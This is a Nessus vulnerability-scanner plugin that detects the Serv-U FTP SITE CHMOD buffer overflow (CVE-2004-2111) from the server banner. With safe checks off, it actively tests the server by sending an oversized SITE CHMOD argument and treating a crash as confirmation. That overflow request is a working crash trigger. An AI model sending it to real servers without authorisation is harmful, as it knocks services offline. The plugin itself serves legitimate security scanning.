#
# Written by Astharot <astharot@zone-h.org>
# 
# Changes by Tenable:
# - Revised plugin title, added OSVDB refs, enhanced description (2/03/2009)


include("compat.inc");

if(description)
{
 script_id(12037);
 script_cve_id("CVE-2004-2111", "CVE-2004-2533");
 script_bugtraq_id(9483, 9675);
 script_xref(name:"OSVDB", value:"3713");
 script_xref(name:"OSVDB", value:"51701");
 script_version ("$Revision: 1.19 $");
 
 script_name(english:"Serv-U SITE CHMOD Command Multiple Vulnerabilities");
	     
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Serv-U FTP Server. 

There is a bug in the way this server handles arguments to the SITE
CHMOD requests that may allow an attacker to trigger a buffer overflow
or corrupt memory against this server and thereby disable the server 
remotely or to potentially execute arbitrary code on the host. 

Note that successful exploitation requires access to a writable
directory and will result in code running with Administrator or SYSTEM
privileges by default." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-01/0249.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2004-02/0881.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Serv-U FTP Server version 4.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:S/C:C/I:C/A:C" );
script_end_attributes();

 
 script_summary(english:"Serv-U Stack Overflow");
 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 Astharot");
		  
 script_require_ports("Services/ftp", 21);
 script_dependencie("find_service1.nasl", "ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");

 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

banner = get_ftp_banner(port:port);
if (!banner || "Serv-U FTP" >!< banner) exit(0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");
if (!login || safe_checks()) {
 if(egrep(pattern:"Serv-U FTP[- ]Server v([0-3]|4\.[0-1])\.", string:banner)) {
  report = string(
   "\n",
   "Note that Nessus has determined the vulnerability exists on the remote\n",
   "host simply by looking at the software's banner.  To really check for\n",
   "the vulnerability, disable safe_checks and re-run the scan.\n"
  );
  security_hole(port:port, extra:report);
 }
 exit(0);
}


if(login)
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 if(ftp_authenticate(socket:soc, user:login,pass:password))
 {
 crp = crap(data:"a", length:2000);
 req = string("SITE CHMOD 0666  ", crp, "\r\n");
 send(socket:soc, data:req);
 r = recv_line(socket:soc, length:4096);
 if(!r)
 {
  security_hole(port);
  exit(0);
 }
 data = string("QUIT\r\n");
 send(socket:soc, data:data);
 }
 close(soc);
}
